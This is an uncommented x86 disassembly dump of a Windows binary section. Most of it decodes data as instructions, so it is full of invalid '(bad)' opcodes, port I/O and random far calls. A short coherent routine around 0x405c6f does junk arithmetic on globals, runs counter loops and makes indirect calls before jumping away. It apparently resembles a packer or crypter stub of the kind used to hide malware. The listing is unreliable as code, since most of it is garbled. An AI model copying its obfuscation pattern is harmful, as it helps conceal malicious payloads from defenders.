  405769:	or     dl,dh
  40576b:	inc    edx
  40576c:	aas    
  40576d:	push   cs
  40576e:	data16 jae 0x405760
  405771:	out    0xd5,eax
  405773:	xchg   ecx,eax
  405774:	scas   eax,DWORD PTR es:[edi]
  405775:	adc    ah,ch
  405777:	xchg   ecx,eax
  405778:	cwde   
  405779:	scas   al,BYTE PTR es:[edi]
  40577a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40577b:	dec    BYTE PTR [edx]
  40577d:	or     BYTE PTR [edi+0x27],ah
  405780:	pop    eax
  405781:	lahf   
  405782:	mov    esi,0x550bf9d
  405787:	fld    DWORD PTR [ecx+0x50]
  40578a:	gs pop esp
  40578c:	mov    eax,0x4f6d872d
  405791:	mov    BYTE PTR [edi+0x62],0x29
  405795:	outs   dx,DWORD PTR ds:[esi]
  405796:	or     al,0xb2
  405798:	mov    BYTE PTR ds:0x3c48c4c,ah
  40579e:	mov    ebx,0xb58e4b22
  4057a3:	cmp    cl,bh
  4057a5:	mov    ebx,DWORD PTR [esp+edi*1+0x1a]
  4057a9:	mov    dh,0xb1
  4057ab:	ds cmp al,0x3b
  4057ae:	retf   0x7cb0
  4057b1:	lds    ebx,FWORD PTR [eax-0x6a023056]
  4057b7:	retf   
  4057b8:	add    al,0xa6
  4057ba:	xchg   esi,eax
  4057bb:	inc    esi
  4057bc:	fidivr WORD PTR [esp+eiz*2-0x32cc20ac]
  4057c3:	es ja  0x4057ac
  4057c6:	loopne 0x4057fb
  4057c8:	call   DWORD PTR [edx]
  4057ca:	into   
  4057cb:	jae    0x40576a
  4057cd:	mov    ebp,0x8ff7f099
  4057d2:	repnz cmp DWORD PTR [edx],ebx
  4057d5:	out    0x31,eax
  4057d7:	in     al,dx
  4057d8:	(bad)  
  4057d9:	push   0x70a468ca
  4057de:	jne    0x405821
  4057e0:	lods   eax,DWORD PTR ds:[esi]
  4057e1:	pop    ss
  4057e2:	jne    0x40582b
  4057e4:	push   ss
  4057e5:	mov    bl,0xbb
  4057e7:	xchg   BYTE PTR ds:0xe13ab578,ch
  4057ed:	pop    ds
  4057ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057ef:	push   esi
  4057f0:	dec    ebx
  4057f1:	mov    ch,0x55
  4057f3:	int    0xd4
  4057f5:	cmp    DWORD PTR [ebx],ecx
  4057f7:	icebp  
  4057f8:	in     eax,dx
  4057f9:	arpl   WORD PTR [esi+0x6f],bp
  4057fc:	test   WORD PTR [ebx+0x37730731],cx
  405803:	push   ebp
  405804:	icebp  
  405805:	(bad)  
  405806:	ss das 
  405808:	mov    esp,0x56139974
  40580d:	loop   0x4057db
  40580f:	pop    fs
  405811:	push   ss
  405812:	pop    ecx
  405813:	xor    dh,bh
  405815:	push   0x5a6f5b0e
  40581a:	aas    
  40581b:	or     eax,0x6cea8871
  405820:	mov    ds:0x7625593d,al
  405825:	in     eax,0xcc
  405827:	mov    eax,0x38a48c04
  40582c:	loope  0x40580d
  40582e:	add    BYTE PTR [edi+0x2e],0x45
  405832:	loope  0x4058a0
  405834:	push   ecx
  405835:	aaa    
  405836:	mov    esi,0x9111c73a
  40583b:	sub    al,0x95
  40583d:	pop    es
  40583e:	fwait
  40583f:	dec    ecx
  405840:	or     dl,BYTE PTR [edi+0xb]
  405843:	ins    DWORD PTR es:[edi],dx
  405844:	test   eax,0x9f90d1c5
  405849:	jae    0x4058ba
  40584b:	ss jp  0x405847
  40584e:	popf   
  40584f:	add    eax,0x40432e3d
  405854:	mov    bh,0x8
  405856:	jg     0x4058ca
  405858:	jae    0x40583b
  40585a:	loopne 0x4058a4
  40585c:	mov    ds:0xacba30eb,eax
  405861:	out    0x25,eax
  405863:	mov    al,ds:0xde2e85a3
  405868:	dec    edx
  405869:	das    
  40586a:	jp     0x4058dd
  40586c:	pop    es
  40586d:	push   edx
  40586e:	sbb    bh,BYTE PTR [ecx-0x51a36476]
  405874:	push   ebp
  405875:	sub    bl,BYTE PTR [ebx-0x469481e4]
  40587b:	ret    
  40587c:	add    al,0x20
  40587e:	aam    0x54
  405880:	and    ch,BYTE PTR [ecx]
  405882:	push   0xb81a4899
  405887:	or     DWORD PTR [ebx+0x3],ebx
  40588a:	pop    esp
  40588b:	fcom   QWORD PTR [ebx-0x2c]
  40588e:	xchg   DWORD PTR [edi-0x350ae1e],esi
  405894:	or     eax,DWORD PTR [esi]
  405896:	sbb    BYTE PTR [ebx+0x44],bh
  405899:	popf   
  40589a:	or     eax,0xaf94322f
  40589f:	pop    ds
  4058a0:	adc    al,0xe4
  4058a2:	call   0xda39:0x9335fb6d
  4058a9:	in     eax,dx
  4058aa:	dec    edi
  4058ab:	test   al,0x61
  4058ad:	sbb    al,0x39
  4058af:	mov    ch,0x6a
  4058b1:	test   al,0xbb
  4058b3:	pushf  
  4058b4:	mov    bl,dh
  4058b6:	dec    edi
  4058b7:	lea    edx,[ecx]
  4058b9:	popf   
  4058ba:	in     al,dx
  4058bb:	mov    ah,0xb9
  4058bd:	(bad)  
  4058be:	das    
  4058bf:	mov    edx,0x487ea9b6
  4058c4:	push   edi
  4058c5:	push   ebx
  4058c6:	add    ch,BYTE PTR [edx-0x7cffbcc4]
  4058cc:	push   ds
  4058cd:	shl    dh,cl
  4058cf:	punpcklbw mm4,DWORD PTR [edi]
  4058d2:	add    dl,BYTE PTR [edi]
  4058d4:	cmp    DWORD PTR [ecx+ecx*8+0x18],esp
  4058d8:	dec    edi
  4058d9:	add    BYTE PTR [ebx+0x62],dh
  4058dc:	cmp    al,0x4a
  4058de:	les    esp,FWORD PTR [esi]
  4058e0:	adc    al,0xe7
  4058e2:	repz xor DWORD PTR [ebp-0xe],0xf36e4ed
  4058ea:	out    0x9c,eax
  4058ec:	add    DWORD PTR ds:0x5ecd8b26,0xffffffdd
  4058f3:	in     eax,0xa0
  4058f5:	sti    
  4058f6:	mov    dl,0x2a
  4058f8:	jge    0x405969
  4058fa:	push   cs
  4058fb:	or     DWORD PTR [ecx+esi*2-0x707164ea],eax
  405902:	(bad)  
  405903:	jmp    0x405892
  405905:	add    ecx,DWORD PTR [ebx-0x45]
  405908:	sbb    al,0x8e
  40590a:	inc    ecx
  40590b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40590c:	push   cs
  40590d:	out    dx,al
  40590e:	add    DWORD PTR [edi+0x70c0c475],ecx
  405914:	or     eax,0x84f04dca
  405919:	call   0xbb1112f0
  40591e:	hlt    
  40591f:	jbe    0x4058a5
  405921:	(bad)  
  405922:	xor    eax,0xc0f4982a
  405927:	sbb    DWORD PTR [eax],0xbb504362
  40592d:	push   ebp
  40592e:	xor    eax,0x7d1da0bf
  405933:	daa    
  405934:	(bad)
  405937:	mov    dl,0x91
  405939:	pop    esi
  40593a:	cmp    al,0xef
  40593c:	add    eax,0xd11042ea
  405941:	fdivrp st(0),st
  405943:	jg     0x40595e
  405945:	out    0x5a,al
  405947:	push   ecx
  405948:	shl    eax,1
  40594a:	in     eax,0xe6
  40594c:	add    edi,DWORD PTR [ebx-0x460ad49]
  405952:	xor    edx,esi
  405954:	pop    es
  405955:	stc    
  405956:	shr    BYTE PTR [ecx-0x4c],cl
  405959:	dec    ecx
  40595a:	in     eax,0x49
  40595c:	into   
  40595d:	aam    0xb8
  40595f:	std    
  405960:	je     0x4059bd
  405962:	gs sub al,0x3
  405965:	cli    
  405966:	loope  0x405933
  405968:	aam    0x78
  40596a:	cmp    eax,0x6aeb9550
  40596f:	shr    DWORD PTR [esi],0x4b
  405972:	adc    al,BYTE PTR [esi]
  405974:	mov    dh,0x7e
  405976:	in     al,0x3f
  405978:	shl    BYTE PTR [eax-0x346e9624],1
  40597e:	retf   0xf43d
  405981:	(bad)  
  405982:	cmp    al,0x9b
  405984:	push   esi
  405985:	xchg   ecx,eax
  405986:	cwde   
  405987:	fcmovnu st,st(4)
  405989:	lds    edi,FWORD PTR [ebp-0x4c601866]
  40598f:	push   ds
  405990:	adc    bl,0x5b
  405993:	mov    edi,0x4933b020
  405998:	call   0xf7bf:0xc54b8e60
  40599f:	inc    ecx
  4059a0:	or     BYTE PTR [edx],ah
  4059a2:	(bad)  
  4059a3:	sar    ah,1
  4059a5:	int    0x3b
  4059a7:	aad    0x12
  4059a9:	enter  0xbd61,0xb1
  4059ad:	ret    
  4059ae:	adc    al,0x1a
  4059b0:	pop    ecx
  4059b1:	jb     0x40594c
  4059b3:	sar    BYTE PTR [ebp+eiz*4+0x218fc211],1
  4059ba:	repz xor al,0x65
  4059bd:	out    0xa0,eax
  4059bf:	imul   ecx,DWORD PTR [edx],0xffffffba
  4059c2:	mov    esp,es
  4059c4:	pop    es
  4059c5:	cmp    ebp,DWORD PTR [edx-0x72c2d97e]
  4059cb:	ins    BYTE PTR es:[edi],dx
  4059cc:	pop    esi
  4059cd:	clc    
  4059ce:	imul   ebp,DWORD PTR [ebp+0x31a41bc2],0xffffffdb
  4059d5:	xchg   esp,eax
  4059d6:	(bad)  
  4059d7:	dec    edi
  4059d8:	mul    dh
  4059da:	mov    ecx,0x474612dd
  4059df:	fstp   DWORD PTR [esi]
  4059e1:	rol    BYTE PTR [edx],0x7b
  4059e4:	pop    esi
  4059e5:	rcl    DWORD PTR [esi],1
  4059e7:	cmp    ax,0x2dd7
  4059eb:	jbe    0x405a56
  4059ed:	mov    bh,0x46
  4059ef:	xor    ah,ah
  4059f1:	clc    
  4059f2:	jno    0x405a64
  4059f4:	outs   dx,DWORD PTR ds:[esi]
  4059f5:	inc    esi
  4059f6:	push   ds
  4059f7:	aas    
  4059f8:	js     0x405a50
  4059fa:	pop    ds
  4059fb:	push   0xffffffc7
  4059fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059fe:	add    dh,al
  405a00:	call   0xbf00f0f8
  405a05:	shr    bl,0x46
  405a08:	fdivr  DWORD PTR [edi+0x31]
  405a0b:	pusha  
  405a0c:	add    DWORD PTR [ecx-0x16],0xbf2b57f
  405a13:	jecxz  0x405a89
  405a15:	outs   dx,BYTE PTR ds:[esi]
  405a16:	das    
  405a17:	xchg   ebp,eax
  405a18:	mov    ebp,0x221d93e9
  405a1d:	jl     0x4059a2
  405a1f:	jae    0x4059e9
  405a21:	(bad)  
  405a22:	stos   DWORD PTR es:[edi],eax
  405a23:	push   edi
  405a24:	scas   al,BYTE PTR es:[edi]
  405a25:	or     DWORD PTR [ecx-0x759bebd6],0x34abfa55
  405a2f:	(bad)
  405a32:	add    eax,0xbb26509d
  405a37:	ins    DWORD PTR es:[edi],dx
  405a38:	dec    ebx
  405a39:	iret   
  405a3a:	inc    ebp
  405a3b:	jo     0x405a4a
  405a3d:	mov    WORD PTR [ebx+0x31],ss
  405a40:	sbb    al,0x6a
  405a42:	imul   ebp,DWORD PTR [edx-0x22d6b3e5],0xffffffe5
  405a49:	aas    
  405a4a:	arpl   WORD PTR [ecx+0x9],dx
  405a4d:	mov    edx,ebx
  405a4f:	arpl   WORD PTR [ebx+0x18443479],di
  405a55:	mov    esi,ebp
  405a57:	fwait
  405a58:	popf   
  405a59:	dec    esp
  405a5a:	lock adc eax,0xac4a3ecc
  405a60:	hlt    
  405a61:	sahf   
  405a62:	adc    al,0xd7
  405a64:	adc    al,0x5d
  405a66:	loopne 0x405a43
  405a68:	(bad)  
  405a69:	not    BYTE PTR [esi+ebx*2]
  405a6c:	std    
  405a6d:	push   ebp
  405a6e:	mov    esp,0x6d252f7a
  405a73:	add    al,BYTE PTR [edi-0xee8ffc2]
  405a79:	jbe    0x405ac4
  405a7b:	lock xchg BYTE PTR [eax+0x38f4a011],al
  405a82:	xor    eax,0xbe72e268
  405a87:	outs   dx,BYTE PTR ds:[esi]
  405a88:	int3   
  405a89:	mov    ds:0x939d7ba4,al
  405a8e:	push   ebx
  405a8f:	inc    edx
  405a90:	mov    ch,0xed
  405a92:	adc    BYTE PTR ds:0x22a7c89,dh
  405a98:	xlat   BYTE PTR ds:[ebx]
  405a99:	dec    eax
  405a9a:	imul   esi,DWORD PTR [ebp-0x9],0x2f
  405a9e:	retf   
  405a9f:	mov    ch,0x48
  405aa1:	inc    ebx
  405aa2:	fsub   QWORD PTR [ecx+edi*4+0x69]
  405aa6:	nop
  405aa7:	imul   DWORD PTR cs:[esi-0x2f]
  405aab:	jnp    0x405a9e
  405aad:	scas   eax,DWORD PTR es:[edi]
  405aae:	sub    al,0x6f
  405ab0:	pop    edi
  405ab1:	lock mov ebx,DWORD PTR [edx+0x11]
  405ab5:	or     eax,0x598e50aa
  405aba:	bound  edx,QWORD PTR [edx+0x3c]
  405abd:	call   0x36e7e46f
  405ac2:	lock adc esi,ebp
  405ac5:	xlat   BYTE PTR ds:[ebx]
  405ac6:	adc    eax,DWORD PTR [edi+0x5e]
  405ac9:	aad    0xb2
  405acb:	je     0x405af4
  405acd:	repnz pop ds
  405acf:	push   DWORD PTR [eax+0x25]
  405ad2:	sbb    DWORD PTR ds:0x4d098d02,ecx
  405ad8:	(bad)  
  405ad9:	sbb    DWORD PTR [esi+edx*8+0x39505fe7],ebp
  405ae0:	fild   DWORD PTR [edi+ebx*2+0x4c]
  405ae4:	push   esp
  405ae5:	cmp    al,0x81
  405ae7:	int3   
  405ae8:	inc    edx
  405ae9:	cs loop 0x405a88
  405aec:	popw   es
  405aee:	cmp    BYTE PTR [esi],cl
  405af0:	xchg   ebx,ecx
  405af2:	push   esp
  405af3:	inc    edi
  405af4:	mov    eax,0x61bc24e8
  405af9:	fs push edx
  405afb:	lods   al,BYTE PTR ds:[esi]
  405afc:	inc    ecx
  405afd:	pushf  
  405afe:	test   eax,0xea53dfea
  405b03:	cmp    ah,BYTE PTR [ebp+0x126e7c84]
  405b09:	lock jb 0x405aff
  405b0c:	fs xchg ebp,eax
  405b0e:	iret   
  405b0f:	push   0x4429433e
  405b14:	addr16 pop es
  405b16:	adc    ebx,DWORD PTR [esi+0x7b0f03e8]
  405b1c:	shl    BYTE PTR [ebx-0x28],0xa3
  405b20:	nop
  405b21:	jo     0x405b6d
  405b23:	std    
  405b24:	inc    ebx
  405b25:	enter  0xdf9d,0x39
  405b29:	mov    ch,0x56
  405b2b:	push   0x88d79bc7
  405b30:	xor    eax,0xd3a65af3
  405b35:	ins    BYTE PTR es:[edi],dx
  405b36:	push   edx
  405b37:	and    DWORD PTR [ecx],esp
  405b39:	push   0x751d6f55
  405b3e:	push   ds
  405b3f:	test   ah,ah
  405b41:	(bad)  
  405b42:	sti    
  405b43:	jl     0x405b2e
  405b45:	jns    0x405b87
  405b47:	lods   al,BYTE PTR ds:[esi]
  405b48:	inc    esi
  405b49:	aas    
  405b4a:	ror    DWORD PTR [edx+0x9543225],0x9f
  405b51:	dec    ebp
  405b52:	cli    
  405b53:	add    cl,BYTE PTR [edx+0x7]
  405b56:	push   eax
  405b57:	cmc    
  405b58:	shl    DWORD PTR [ebx+0x10],0x85
  405b5c:	sbb    DWORD PTR [ecx-0x61],0xffffff8d
  405b60:	jno    0x405afe
  405b62:	je     0x405bb5
  405b64:	push   edx
  405b65:	icebp  
  405b66:	retf   0x7d55
  405b69:	int3   
  405b6a:	(bad)  
  405b6b:	jl     0x405b0d
  405b6d:	and    ah,BYTE PTR [esi+0x7be9f11d]
  405b73:	mov    ch,0x3d
  405b75:	sahf   
  405b76:	dec    esp
  405b77:	adc    DWORD PTR [ebx-0x7f],ecx
  405b7a:	cmp    ecx,esp
  405b7c:	enter  0xcd7f,0x17
  405b80:	mov    esi,0x605c88ce
  405b85:	out    dx,eax
  405b86:	xchg   esi,eax
  405b87:	addr16 into 
  405b89:	dec    esp
  405b8a:	mov    DWORD PTR [eax-0x6a005a90],esp
  405b90:	add    DWORD PTR [ecx+0xe],ebx
  405b93:	adc    eax,0x35
  405b96:	test   BYTE PTR [eax-0x4c],0xd4
  405b9a:	or     esp,DWORD PTR [eax]
  405b9c:	adc    eax,0xb066133d
  405ba1:	add    DWORD PTR [eax],ebx
  405ba3:	jp     0x405bd4
  405ba5:	jg     0x405c0e
  405ba7:	xchg   edx,eax
  405ba8:	inc    ebx
  405ba9:	rcl    DWORD PTR [edi],1
  405bab:	shr    DWORD PTR [esi+0x3b9cbdb7],0xbb
  405bb2:	pop    esi
  405bb3:	mov    ecx,0x6ce20312
  405bb8:	sti    
  405bb9:	in     al,0x74
  405bbb:	push   esi
  405bbc:	nop
  405bbd:	push   ds
  405bbe:	mov    edx,0xe7962df0
  405bc3:	lds    esp,FWORD PTR [esp+eax*1+0x3e]
  405bc7:	pop    edx
  405bc8:	std    
  405bc9:	mov    esi,0x1cc1d8bc
  405bce:	adc    esi,esi
  405bd0:	fwait
  405bd1:	mov    ds:0xbe28d39f,al
  405bd6:	xor    edi,DWORD PTR [ebp+0x584f42a1]
  405bdc:	fdivr  QWORD PTR [edx-0x1d07e851]
  405be2:	push   ebx
  405be3:	repnz or DWORD PTR [ebx],edx
  405be6:	fwait
  405be7:	iret   
  405be8:	push   esi
  405be9:	shl    DWORD PTR [eax-0x7dda0386],0x80
  405bf0:	ja     0x405c37
  405bf2:	adc    BYTE PTR [edx-0x52d860cb],bl
  405bf8:	and    DWORD PTR [esi],edx
  405bfa:	cs call 0xa1745c8a
  405c00:	push   0xffffff95
  405c02:	call   0x1f6e:0xe5e1557e
  405c09:	mov    al,0xbe
  405c0b:	mov    al,ds:0xe99f4bcc
  405c10:	pushf  
  405c11:	jg     0x405c5c
  405c13:	mov    edi,DWORD PTR [ecx+0x38]
  405c16:	call   0xceb4:0x96e3317a
  405c1d:	dec    eax
  405c1e:	sub    BYTE PTR [edx+esi*2],0xa1
  405c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c23:	push   eax
  405c24:	retf   0xb4d3
  405c27:	fdivr  QWORD PTR [ecx-0x6d]
  405c2a:	ins    BYTE PTR es:[edi],dx
  405c2b:	or     al,0x51
  405c2d:	rcr    ebp,0x1
  405c30:	pop    esi
  405c31:	cmp    ch,BYTE PTR [ebp-0x15]
  405c34:	loopne 0x405c82
  405c36:	pusha  
  405c37:	stos   BYTE PTR es:[edi],al
  405c38:	xchg   esi,eax
  405c39:	push   ebp
  405c3a:	mov    ebp,0xb7668e8c
  405c3f:	aaa    
  405c40:	push   esp
  405c41:	pop    ebp
  405c42:	mov    ds:0x90c68bfd,eax
  405c47:	push   0xffffffbd
  405c49:	shl    DWORD PTR [edx+0x54],0x36
  405c4d:	mov    eax,0x6c8da50c
  405c52:	(bad)  
  405c53:	enter  0x5eff,0xfe
  405c57:	retf   
  405c58:	mov    BYTE PTR ds:0x3d69a5b5,ch
  405c5e:	rol    BYTE PTR [esp+ecx*1+0x79239572],cl
  405c65:	in     eax,0xdb
  405c67:	test   eax,0x5f97d25d
  405c6c:	pop    esi
  405c6d:	leave  
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423573
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx-0x43258b41]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	bound  ebp,QWORD PTR [esi-0x1]
  405e13:	icebp  
  405e14:	and    eax,0xa184d9c6
  405e19:	or     ebp,ecx
  405e1b:	add    DWORD PTR [ebp-0x43],ecx
  405e1e:	icebp  
  405e1f:	sar    DWORD PTR ds:0xdffca7a0,0x9d
  405e26:	cli    
  405e27:	pop    edx
  405e28:	iret   
  405e29:	rol    ch,1
  405e2b:	push   0xdbe72af9
  405e30:	jno    0x405e33
  405e32:	mov    ebp,DWORD PTR [esi+0x427a931c]
  405e38:	sahf   
  405e39:	jno    0x405df8
  405e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3c:	aas    
  405e3d:	pop    esi
  405e3e:	jg     0x405e29
  405e40:	adc    BYTE PTR [eax+0x58],0x6b
  405e44:	cmp    eax,DWORD PTR [edx+0x3a]
  405e47:	retf   
  405e48:	cwde   
  405e49:	enter  0x1d17,0xe8
  405e4d:	and    eax,DWORD PTR [edi+esi*1-0x5d8498bd]
  405e54:	add    DWORD PTR [edi-0x5756e645],eax
  405e5a:	pop    ebp
  405e5b:	les    esi,FWORD PTR [ebx-0x3d]
  405e5e:	imul   ebx,ebp,0x69
  405e61:	inc    esi
  405e62:	adc    cl,BYTE PTR [ecx+0x39]
  405e65:	imul   eax,DWORD PTR [ecx],0xffffffb6
  405e68:	adc    al,0x56
  405e6a:	nop
  405e6b:	fmul   QWORD PTR [edx+edx*8+0x49]
  405e70:	je     0x405e2f
  405e72:	aas    
  405e73:	push   edx
  405e74:	push   ss
  405e75:	mov    ebp,0x123ed7d0
  405e7a:	clc    
  405e7b:	jl     0x405ed6
  405e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e7e:	xor    eax,0xb2741527
  405e83:	mov    al,ds:0xeb99a4f8
  405e88:	cmp    al,dh
  405e8a:	xchg   DWORD PTR [edx+edi*8],eax
  405e8d:	mov    eax,edx
  405e8f:	and    eax,0xa2d8846a
  405e94:	aaa    
  405e95:	outs   dx,BYTE PTR ds:[esi]
  405e96:	adc    dh,BYTE PTR [ecx]
  405e98:	sahf   
  405e99:	xor    eax,0xb3e302be
  405e9e:	jmp    0x66393331
  405ea3:	pop    ds
  405ea4:	jge    0x405eff
  405ea6:	sub    eax,0x80c110d4
  405eab:	mov    ch,cl
  405ead:	sub    DWORD PTR [ebp*4+0x782d485a],ecx
  405eb4:	je     0x405f28
  405eb6:	ret    
  405eb7:	adc    BYTE PTR [ebx],bh
  405eb9:	add    al,BYTE PTR [ebx+0x6b]
  405ebc:	pop    ss
  405ebd:	fsubr  st,st(5)
  405ebf:	test   BYTE PTR [eax+0x1d83cd94],bh
  405ec5:	(bad)  
  405ec6:	dec    ebp
  405ec7:	test   DWORD PTR [esi-0x6f],ecx
  405eca:	stc    
  405ecb:	pop    edi
  405ecc:	push   0xffffffc8
  405ece:	sub    BYTE PTR [ebx+0xef6f5c3],dh
  405ed4:	aas    
  405ed5:	mov    cl,0xfb
  405ed7:	add    al,dl
  405ed9:	data16 add cl,BYTE PTR [edi]
  405edc:	int3   
  405edd:	push   DWORD PTR [edx+0x1775518a]
  405ee3:	xchg   edi,eax
  405ee4:	cmp    al,0x8e
  405ee6:	enter  0xf83d,0x26
  405eea:	pop    es
  405eeb:	mov    dh,BYTE PTR [ebx]
  405eed:	sub    dl,BYTE PTR [ebp+0x56]
  405ef0:	xchg   ebx,eax
  405ef1:	mov    ds:0x6f94f5b7,al
  405ef6:	(bad)  
  405ef7:	sbb    ebp,DWORD PTR [ecx]
  405ef9:	pushf  
  405efa:	cs in  al,dx
  405efc:	inc    ebx
  405efd:	ss add ah,cl
  405f00:	adc    DWORD PTR [edx+0x574e8949],0x58
  405f07:	mov    ebx,0x55bd541f
  405f0c:	sbb    BYTE PTR [ebp+0x5c344b35],al
  405f12:	imul   edi,DWORD PTR ds:0xa32bcee7,0xffffffb4
  405f19:	clc    
  405f1a:	sahf   
  405f1b:	or     DWORD PTR [ebx+ecx*1-0x3b],ecx
  405f1f:	mov    ebx,0x97b96deb
  405f24:	xor    ah,BYTE PTR ds:[ebp+0x2e8de6d6]
  405f2b:	inc    edi
  405f2c:	sbb    ecx,DWORD PTR [eax-0x68]
  405f2f:	aaa    
  405f30:	imul   esi,DWORD PTR [edi-0x74],0x97c0a77b
  405f37:	sti    
  405f38:	mov    bl,0x35
  405f3a:	mov    dh,0xbc
  405f3c:	shl    BYTE PTR [ebx+0x2c],cl
  405f3f:	mov    dl,0xe5
  405f41:	jg     0x405f4b
  405f43:	std    
  405f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f45:	jp     0x405f61
  405f47:	xchg   esp,eax
  405f48:	adc    eax,0xc3cc1249
  405f4d:	dec    ebp
  405f4e:	push   ebp
  405f4f:	ror    DWORD PTR [edx+0x1a],cl
  405f52:	retf   0xd0f1
  405f55:	cmp    edx,DWORD PTR [eax+0x6b]
  405f58:	loope  0x405fb3
  405f5a:	xchg   esp,eax
  405f5b:	inc    eax
  405f5c:	ins    DWORD PTR es:[edi],dx
  405f5d:	lock sub dh,0x27
  405f61:	call   FWORD PTR [ecx-0x42e11b43]
  405f67:	rcl    DWORD PTR [ecx+0x4d92e2bb],cl
  405f6d:	push   eax
  405f6e:	bswap  esp
  405f70:	clc    
  405f71:	pop    ds
  405f72:	inc    ebx
  405f73:	jne    0x405f5f
  405f75:	das    
  405f76:	shr    DWORD PTR [edi-0x80],cl
  405f79:	lods   al,BYTE PTR ds:[esi]
  405f7a:	fdiv   DWORD PTR fs:0xefc5c54f
  405f81:	xor    ebx,DWORD PTR [ecx-0x6d7f12a8]
  405f87:	hlt    
  405f88:	or     DWORD PTR [esi-0x74],ebx
  405f8b:	inc    eax
  405f8c:	icebp  
  405f8d:	pop    es
  405f8e:	jnp    0x405fd8
  405f90:	stos   DWORD PTR es:[edi],eax
  405f91:	dec    ecx
  405f92:	cmp    eax,0xae5a9e7c
  405f97:	test   DWORD PTR [edx+0x3f74e3fb],0x3690354f
  405fa1:	neg    dh
  405fa3:	and    ebp,eax
  405fa5:	dec    ecx
  405fa6:	mov    al,0xe3
  405fa8:	push   esi
  405fa9:	dec    edi
  405faa:	push   esp
  405fab:	and    eax,0x88cedc2d
  405fb0:	pop    edi
  405fb1:	loopne 0x40600d
  405fb3:	fstp   TBYTE PTR [ecx+0x56]
  405fb6:	xor    ah,BYTE PTR [edi+0x35]
  405fb9:	gs jo  0x405ff0
  405fbc:	lods   eax,DWORD PTR ds:[esi]
  405fbd:	or     BYTE PTR [ecx],cl
  405fbf:	rcl    DWORD PTR [edx+0x5d],cl
  405fc2:	mov    edi,0x5b9be171
  405fc7:	cmp    al,0xd9
  405fc9:	cmp    bh,BYTE PTR [ebp-0x1bcabe32]
  405fcf:	repz mov al,0x9c
  405fd2:	fbld   TBYTE PTR [ebp+0x34f769ba]
  405fd8:	ja     0x405fac
  405fda:	add    DWORD PTR [esi],ebp
  405fdc:	add    BYTE PTR [ecx-0x79dce3c6],0xee
  405fe3:	xor    eax,DWORD PTR [ecx-0x44]
  405fe6:	pop    edi
  405fe7:	sti    
  405fe8:	sub    BYTE PTR [edx-0x5e],ah
  405feb:	xchg   BYTE PTR [ecx-0x350c65a3],ah
  405ff1:	out    dx,eax
